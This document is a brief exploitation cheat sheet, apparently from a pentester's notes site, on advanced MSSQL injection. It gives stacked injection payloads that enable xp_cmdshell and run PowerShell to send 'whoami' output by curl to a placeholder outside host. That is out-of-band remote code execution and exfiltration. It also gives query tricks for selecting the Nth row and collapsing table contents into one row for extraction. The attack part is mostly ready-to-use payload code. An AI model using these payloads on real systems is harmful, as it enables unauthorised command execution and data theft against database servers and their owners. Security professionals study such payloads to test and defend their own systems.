---
description: MSSQL Injection Advanced Exploitation
---

# MSSQL

#### MSSQL OOB RCE via HTTP

{% code overflow="wrap" %}
```bash
#Enable xp_cmdshell
; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

#Execute command
;EXEC xp_cmdshell 'powershell -c "$x = whoami; curl http://xxx/get?output=$x"';--
```
{% endcode %}

#### MSSQL get the Nth row

We can use the following query to get the **N**th row, like LIMIT 9,1 in mysql.

{% code overflow="wrap" %}
```bash
#Select 9th row (like LIMIT 9,1)
select top 1 table_name from (select top 9 table_name from information_schema.tables order by table_name ASC) sq order by table_name DESC
```
{% endcode %}

#### MSSQL concatenate output into a single row

```bash
SELECT top 10 * from USERS for xml raw;
```
